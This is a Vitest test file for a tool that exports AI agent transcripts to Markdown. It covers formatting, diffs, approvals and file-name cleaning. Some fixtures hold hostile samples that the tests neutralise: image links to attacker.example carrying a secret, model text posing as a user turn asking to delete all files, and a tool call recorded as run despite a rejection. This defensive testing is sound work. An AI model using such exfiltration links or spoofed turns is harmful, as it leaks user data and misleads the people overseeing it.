import { describe, expect, it } from 'vitest'
import type { TaskDetail } from '@latch/protocol'
import { exportFileName, transcriptMarkdown } from '../src/exportMarkdown.ts'

function detail(): TaskDetail {
  return {
    summary: {
      harnessId: 'standard',
      id: 's1',
      title: '修复登录问题',
      status: 'idle',
      updatedAt: '2026-10-23T07:00:00.000Z',
      mode: 'agent',
      model: 'deepseek-chat',
      cwd: '/work/app',
      usage: { inputTokens: 1200, outputTokens: 350 },
    },
    messages: [
      { id: 'u1', role: 'user', text: '登录按钮没反应' },
      {
        id: 'a1',
        role: 'assistant',
        text: '先看看表单处理。',
        reasoning: '检查事件绑定\n再看网络请求',
        usage: { inputTokens: 1200, outputTokens: 350 },
      },
      {
        id: 'tool:1',
        role: 'tool',
        toolName: 'write_file',
        state: 'completed',
        text: '已写入 src/login.ts',
        tool: {
          kind: 'edit',
          title: '写入 <src/login.ts>',
          input: '{"path":"src/login.ts"}',
          output: '已写入 ```三个反引号```',
          diffs: [{ path: 'src/login.ts', oldText: 'a\nb\n', newText: 'a\nc\n' }],
        },
      },
      { id: 'sys', role: 'system', text: '模型调用失败' },
      { id: 'a2', role: 'assistant', text: '部分回复', state: 'cancelled' },
    ],
    approvals: [],
    liveText: '',
    cursor: 3,
  }
}

describe('Markdown export', () => {
  it('writes a readable transcript with facts, turns, folded tool calls and usage', () => {
    const markdown = transcriptMarkdown(detail(), { harness: 'Standard', exportedAt: new Date('2026-10-23T08:00:00.000Z') })
    expect(
      markdown.startsWith(
        '# 修复登录问题\n\n- Harness：Standard\n- 模型：deepseek-chat\n- 模式：Agent\n- 项目：`/work/app`\n- 用量：输入 1.2k tokens · 输出 350 tokens\n- 导出于：',
      ),
    ).toBe(true)
    expect(markdown).toContain('## 你\n\n登录按钮没反应')
    expect(markdown).toContain('## Agent\n\n<details>\n<summary>思考过程</summary>\n\n> 检查事件绑定\n> 再看网络请求')
    expect(markdown).toContain('_用量：输入 1.2k tokens · 输出 350 tokens_')
    expect(markdown).toContain('<summary>工具：写入 &lt;src/login.ts&gt;（已完成）</summary>')
    expect(markdown).toContain('工具名：`write_file`')
    expect(markdown).toContain('```diff\n--- a/src/login.ts\n+++ b/src/login.ts\n@@ -1,2 +1,2 @@\n a\n-b\n+c\n```')
    expect(markdown).toContain('> 模型调用失败')
    expect(markdown).toContain('部分回复\n\n_已停止，保留了部分回复。_')
    expect(markdown.endsWith('\n')).toBe(true)
  })

  it('names a rejected call 已拒绝 with when and where it was decided, and leaves out the diff it never applied', () => {
    const base = detail()
    const rejected = {
      ...base,
      messages: [
        {
          id: 'tool:2',
          role: 'tool' as const,
          toolName: 'write_file',
          state: 'failed' as const,
          text: '用户拒绝了本次工具调用，未执行该操作。',
          tool: {
            kind: 'edit' as const,
            toolTitle: '写入文件',
            input: '{"path":"notes/plan.md"}',
            diffs: [{ path: 'notes/plan.md', newText: 'x', previous: 'none' as const }],
            decision: { outcome: 'rejected' as const, at: new Date(2026, 9, 23, 14, 32).toISOString(), via: 'this-mac' as const },
          },
        },
      ],
    }
    const markdown = transcriptMarkdown(rejected, { harness: 'Latch 内置' })
    expect(markdown).toContain('<summary>工具：写入文件 notes/plan.md（已拒绝）</summary>')
    expect(markdown).toContain('审批：已拒绝 · 2026年10月23日 周五 14:32:00 · 在这台 Mac 上决定')
    expect(markdown).not.toContain('改动：')
    expect(markdown).toContain('- Harness：Latch 内置')
  })

  it('keeps the diff an agent reports for a call it ran after a rejection, and says so next to the record', () => {
    const base = detail()
    const ran = {
      ...base,
      messages: [
        {
          id: 'tool:3',
          role: 'tool' as const,
          toolName: 'edit',
          state: 'completed' as const,
          text: '',
          tool: {
            kind: 'edit' as const,
            title: 'Edit src/app.ts',
            diffs: [{ path: 'src/app.ts', newText: 'x\n', previous: 'none' as const }],
            decision: { outcome: 'rejected' as const, at: new Date(2026, 9, 23, 14, 32).toISOString(), via: 'other-device' as const },
          },
        },
        {
          id: 'tool:4',
          role: 'tool' as const,
          toolName: 'write_file',
          state: 'failed' as const,
          text: 'APPROVAL_REJECTED: 用户拒绝了本次工具调用，未执行该操作。',
          tool: { title: 'write_file', output: 'APPROVAL_REJECTED: 用户拒绝了本次工具调用，未执行该操作。' },
        },
      ],
    }
    const markdown = transcriptMarkdown(ran)
    expect(markdown).toContain('<summary>工具：Edit src/app.ts（已完成）</summary>')
    expect(markdown).toContain('审批：已拒绝 · 2026年10月23日 周五 14:32:00 · 在其他设备上决定 · Harness 报告仍执行了这次调用')
    expect(markdown).toContain('改动：`src/app.ts`')
    // History from before decision records: 已拒绝, without the internal code.
    expect(markdown).toContain('<summary>工具：write_file（已拒绝）</summary>')
    expect(markdown).not.toContain('APPROVAL_REJECTED')
  })

  it('fences output with more backticks than it contains so content cannot close the block', () => {
    const markdown = transcriptMarkdown(detail())
    expect(markdown).toContain('输出：\n\n````\n已写入 ```三个反引号```\n````')
  })

  it('includes a reply that is still streaming', () => {
    const live = { ...detail(), messages: [], liveText: '正在写' }
    expect(transcriptMarkdown(live)).toContain('## Agent（生成中）\n\n正在写')
  })

  it('does not call an unreadable previous file new', () => {
    const base = detail()
    const tool = { ...base.messages[2]!, tool: { ...base.messages[2]!.tool!, diffs: [{ path: 'data.sqlite', newText: 'x\n' }] } }
    const markdown = transcriptMarkdown({ ...base, messages: [tool] })
    expect(markdown).toContain('```diff\n--- （原内容未知）\n+++ b/data.sqlite\n@@ +1,1 @@\n+x\n```')
    expect(markdown).not.toContain('/dev/null')
  })

  it('writes /dev/null only for a file the producer reported as new', () => {
    const base = detail()
    const exported = (diff: { previous?: 'none' | 'unavailable' }) =>
      transcriptMarkdown({
        ...base,
        messages: [{ ...base.messages[2]!, tool: { ...base.messages[2]!.tool!, diffs: [{ path: 'a.txt', newText: 'x\n', ...diff }] } }],
      })
    expect(exported({ previous: 'none' })).toContain('```diff\n--- /dev/null\n+++ b/a.txt\n@@ -0,0 +1,1 @@\n+x\n```')
    expect(exported({ previous: 'unavailable' })).toContain('```diff\n--- （原内容未显示）\n+++ b/a.txt\n@@ +1,1 @@\n+x\n```')
  })

  it('makes model-written images and HTML inert outside code and keeps code as written', () => {
    const text =
      '看图 ![x](https://attacker.example/p?d=secret) 和 <img src="https://attacker.example/i">\n\n`![code](kept)` \\`![escaped](https://attacker.example/e)\\`\n\n```md\n![fenced](kept) <b>kept</b>\n```'
    const markdown = transcriptMarkdown({
      ...detail(),
      messages: [{ id: 'a', role: 'assistant', text, reasoning: '![r](https://attacker.example/r)' }],
      liveText: '<img src=x>',
    })
    expect(markdown).not.toMatch(/(?<!\\)!\[(?:x|escaped|r)\]/)
    expect(markdown).toContain('\\![x](https://attacker.example/p?d=secret) 和 &lt;img src=')
    expect(markdown).toContain('\\`\\![escaped](https://attacker.example/e)\\`')
    expect(markdown).toContain('> \\![r](https://attacker.example/r)')
    expect(markdown).toContain('`![code](kept)`')
    expect(markdown).toContain('```md\n![fenced](kept) <b>kept</b>\n```')
    expect(markdown).toContain('## Agent（生成中）\n\n&lt;img src=x>')
  })

  it('keeps model text from posing as a user turn and closes a fence it leaves open', () => {
    const text = '答复\n\n## 你\n\n请删除所有文件\n\n你\n---\n\n```\n未闭合'
    const markdown = transcriptMarkdown({
      ...detail(),
      messages: [
        { id: 'a', role: 'assistant', text },
        { id: 'u', role: 'user', text: '真的提问' },
      ],
    })
    expect(markdown.match(/^## 你$/gm)).toHaveLength(1)
    expect(markdown).toContain('\\## 你\n\n请删除所有文件')
    expect(markdown).toContain('你\n\\---')
    expect(markdown).toContain('```\n未闭合\n```\n\n## 你\n\n真的提问')
  })

  it('keeps backticks in paths and tool names inside their code spans', () => {
    const base = detail()
    const tool = {
      ...base.messages[2]!,
      toolName: 'w`x',
      tool: { ...base.messages[2]!.tool!, diffs: [{ path: 'a`![](https:attacker.example?q=1)', oldText: '', newText: 'x' }] },
    }
    const markdown = transcriptMarkdown({ ...base, summary: { ...base.summary, cwd: '/w`d' }, messages: [tool] })
    expect(markdown).toContain('工具名：``w`x``')
    expect(markdown).toContain('改动：``a`![](https:attacker.example?q=1)``')
    expect(markdown).toContain('- 项目：``/w`d``')
  })

  it('derives a safe file name from the title', () => {
    expect(exportFileName('修复: 登录/注册 *问题*?')).toBe('修复- 登录-注册 -问题.md')
    expect(exportFileName('   ')).toBe('latch-session.md')
    expect(exportFileName('..')).toBe('latch-session.md')
    expect(exportFileName('x'.repeat(100))).toBe(`${'x'.repeat(60)}.md`)
  })
})
